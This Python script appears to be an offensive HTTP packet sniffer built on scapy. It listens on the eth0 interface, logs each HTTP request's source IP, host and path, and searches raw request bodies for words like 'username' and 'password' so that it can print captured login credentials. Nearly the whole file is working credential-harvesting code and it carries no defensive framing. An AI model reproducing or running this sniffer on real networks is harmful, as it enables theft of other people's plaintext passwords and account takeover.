#!/usr/bin/env python3
import time
from colorama import Fore
from colorama import Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
#global_variab
choice = " "
def get_current_mac(interface):
 try:
  output = subprocess.check_output(["ifconfig",interface])
  return re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w",str(output)).group(0)
 except:
  pass

def get_current_ip(interface):
 output = subprocess.check_output(["ifconfig",interface])
 pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
 output1 = output.decode()
 ip = pattern.search(output1)[0]
 return ip
def ip_table():
    #get all the interface deatils in with psutil in a variable
 addrs = psutil.net_if_addrs()
 t = PrettyTable([f'{Fore.GREEN}Interface','Mac Address',f'IP Address{Style.RESET_ALL}'])
 for k, v  in addrs.items():
  mac = get_current_mac(k)
  ip = get_current_ip(k)
  if ip and mac:
   t.add_row([k,mac,ip])
  elif mac:
   t.add_row([k,mac,f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
  elif ip:
   t.add_row([k,f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}",ip])
 print(t)
 
def sniff(interface):
    #scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter="port 80")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def process_sniffed_packet(packet):
    #funtion to monitor the packets
    #we check that the packet hac the layer httprequest
    if packet.haslayer(http.HTTPRequest):
        #if the packet has the http request then we check that it contain the RAW fied of the packet
        print("[+] HTTP REQUEST >>>>>")
        url_extractor(packet)
        test = get_login_info(packet)
        #if there's get_login_info data then print those
        if test:
            print(f"{Fore.GREEN}[+] Username OR password is Send >>>> ", test ,f"{Style.RESET_ALL}")
        #To Print the raw Packet
        if (choice=="Y" or choice == "y"):
            raw_http_request(packet)
            
            
def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
            #if it contain the raw fild then print that field post request 
            load = packet[scapy.all.Raw].load
            load_decode = load.decode()
            keywords = ["username","user","email","pass","login","password","UserName","Password"]
            for i in keywords:
                if i in load_decode:
                    return load_decode         

def url_extractor(packet):
    #get the http layer of the packet
    #packet.show() or packet.summary()
    http_layer= packet.getlayer('HTTPRequest').fields
    #get the ip layer of the packet 
    ip_layer = packet.getlayer('IP').fields
    #Print them in a readable form 
    print(ip_layer["src"] , "just requested \n" ,http_layer["Method"].decode()," ",http_layer["Host"].decode(), " " ,http_layer["Path"].decode() )
    return
    
def raw_http_request(packet):
    httplayer = packet[http.HTTPRequest].fields
    print("-----------------***Raw HTTP Packet***-------------------")
    print("{:<8} {:<15}".format('Key','Label'))
    try:
        for k, v in httplayer.items():
            try:
                label = v.decode()
            except:
                pass
            print("{:<40} {:<15}".format(k,label))  
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")  
    print("---------------------------------------------------------")
    
def httpssal()            :
    print(f"{Fore.YELLOW}[*] Starting HTTP Packet Sniffer{Style.RESET_ALL}")
    try:
        global choice
        choice = 'Y'
        #ip_table() : in case you want to check your interfaces names and their ip
        #interface = input("[*] Please enter the interface name : ") delete the next line in case you want to put ur own interface name 
        interface = 'eth0'
        print("[*] Sniffing on Interface eth0 .... ")
        sniff(interface)
        time.sleep(3)
    except KeyboardInterrupt:
        print("\n[+] Quitting Program...")
        time.sleep(3)   
    
